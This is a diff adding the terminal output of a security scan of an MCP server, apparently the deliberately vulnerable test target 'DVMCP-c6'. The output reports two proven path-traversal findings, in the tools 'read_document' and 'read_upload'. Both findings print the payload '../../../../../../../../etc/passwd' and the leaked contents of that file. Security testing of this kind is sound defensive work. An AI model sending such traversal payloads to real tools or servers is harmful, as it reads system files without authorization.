@@ -1,0 +1,17 @@
+
+[1mRedCell MCP scan — DVMCP-c6[0m
+[2m4 tool(s) enumerated · 59 probe call(s) · static + dynamic exploit · OWASP MCP Top 10[0m
+
+  [31m✗ CRITICAL[0m [1mPath Traversal / Unsandboxed File Read[0m [2m· tool 'read_document' · Path Traversal / Unsandboxed File Access (not MCP-specific — see category description) · conf 0.97[0m
+      [2mThe tool returned the contents of a file outside any intended directory — path traversal / missing sandboxing (proven read).[0m
+      [2m↳ Payload: document_name='../../../../../../../../etc/passwd'[0m
+      [2m↳ Observed system-file signature 'root:x:0:0:'[0m
+      [2m↳ Leaked content: root:x:0:0:root:/root:/bin/bash ⏎ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ⏎ bin:x:2:2:bin:/bin:/usr/sbin/nologin ⏎ sys:x:3:3:sys:/dev:/usr/sbin/nologin ⏎ sync:x:4:65534:sync:/bin:/bin/sync ⏎ games:x:5:60:games:/usr/games:/usr/sbin/n…[0m
+  [31m✗ CRITICAL[0m [1mPath Traversal / Unsandboxed File Read[0m [2m· tool 'read_upload' · Path Traversal / Unsandboxed File Access (not MCP-specific — see category description) · conf 0.97[0m
+      [2mThe tool returned the contents of a file outside any intended directory — path traversal / missing sandboxing (proven read).[0m
+      [2m↳ Payload: upload_name='../../../../../../../../etc/passwd'[0m
+      [2m↳ Observed system-file signature 'root:x:0:0:'[0m
+      [2m↳ Leaked content: root:x:0:0:root:/root:/bin/bash ⏎ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ⏎ bin:x:2:2:bin:/bin:/usr/sbin/nologin ⏎ sys:x:3:3:sys:/dev:/usr/sbin/nologin ⏎ sync:x:4:65534:sync:/bin:/bin/sync ⏎ games:x:5:60:games:/usr/games:/usr/sbin/n…[0m
+
+[31m[1m2 vulnerability(s) proven.[0m
+[2mHTML report: /results/report.html[0m
